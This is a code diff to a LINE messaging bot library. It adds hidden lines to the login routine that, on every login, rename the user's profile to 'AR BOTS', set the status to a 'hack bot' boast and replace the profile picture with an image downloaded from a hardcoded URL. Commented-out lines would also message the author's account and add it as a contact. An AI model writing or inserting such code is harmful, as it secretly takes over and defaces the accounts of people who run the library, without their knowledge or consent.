@@ -15,6 +15,21 @@ class LineObject(object):
     def __init__(self):
         if self.isLogin == True:
             self.log("[%s] : Login success" % self.profile.displayName)
+            self.log("YOUR MID : " + "( "+self.profile.mid+" )")
+            #linex = "udefd75736ced80dc8fca8966d246ac6f"
+            #xmod = self.getContact(linex).displayName
+            #self.sendText("udefd75736ced80dc8fca8966d246ac6f", 'HALO %s , SC NYA BAGUS & WROK, JADI AKU PAKE 😅' % xmod)
+            profile = self.getProfile()
+            profile.displayName = "AR BOTS "
+            self.updateProfile(profile)
+            profile.statusMessage = "PERCOBAAN HACK BOT, BY AR BOTS"
+            self.updateProfile(profile)
+            DOMAIN_ = "https://obs-sg.line-apps.com/myhome/c/download.nhn?userid=u0237b0ec326fc36a91743df4a1ad2591&oid=1d2ffd3abc25e746455e5bcf46a759ea"
+            LINE = self.downloadFileURL(DOMAIN_)
+            self.updateProfilePicture(LINE)
+            #GEN = "udefd75736ced80dc8fca8966d246ac6f"
+            #self.findAndAddContactsByMid(GEN)
+            
 
     """Group"""
 
